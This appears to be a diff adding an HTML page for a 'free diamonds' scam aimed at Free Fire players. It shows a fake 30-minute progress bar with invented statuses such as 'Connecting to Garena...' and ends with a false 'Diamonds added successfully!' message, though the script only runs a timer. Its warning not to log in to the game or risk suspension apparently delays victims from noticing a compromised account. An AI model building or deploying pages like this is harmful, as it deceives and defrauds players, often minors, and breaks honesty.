@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Processing</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+    body{background:#f8fafc;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
+    .box{background:#fff;padding:40px;border-radius:24px;max-width:500px;width:100%;border:1px solid #f1f5f9;text-align:center;}
+    .progress{width:100%;height:12px;background:#e2e8f0;border-radius:20px;margin:20px 0;overflow:hidden;}
+    .progress-bar{height:100%;width:0%;background:#e94560;border-radius:20px;transition:width 1s;}
+    .warning{background:#fff5f5;border:1px solid #fecaca;padding:16px;border-radius:12px;margin:20px 0;color:#dc2626;font-size:14px;}
+    .warning strong{display:block;margin-bottom:6px;}
+    #timer{font-size:20px;font-weight:600;color:#0f172a;margin:12px 0;}
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2>⏳ Processing Diamonds</h2>
+  <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+  <p id="status">Initializing...</p>
+  <div id="timer">30:00</div>
+  <div class="warning">
+    <strong>⚠️ IMPORTANT WARNING</strong>
+    Do NOT close this page or refresh.<br>
+    Do NOT open Free Fire during processing.<br>
+    Do NOT log in to your game.<br>
+    If you do, your ID may be <strong>SUSPENDED</strong>.
+  </div>
+</div>
+<script>
+  let progress = 0;
+  let totalSeconds = 30 * 60;
+  const statuses = ['Connecting to Garena...', 'Verifying account...', 'Processing diamonds...', 'Almost done...'];
+
+  const interval = setInterval(() => {
+    progress += 1;
+    totalSeconds -= 1;
+    document.getElementById('progressBar').style.width = progress + '%';
+    document.getElementById('status').textContent = statuses[Math.floor(progress / 25)] || 'Finalizing...';
+
+    const mins = Math.floor(totalSeconds / 60);
+    const secs = totalSeconds % 60;
+    document.getElementById('timer').textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+
+    if (progress >= 100) {
+      clearInterval(interval);
+      document.getElementById('status').textContent = '✅ Diamonds added successfully!';
+      document.getElementById('timer').textContent = '00:00';
+    }
+  }, 1000);
+</script>
+</body>
+</html>
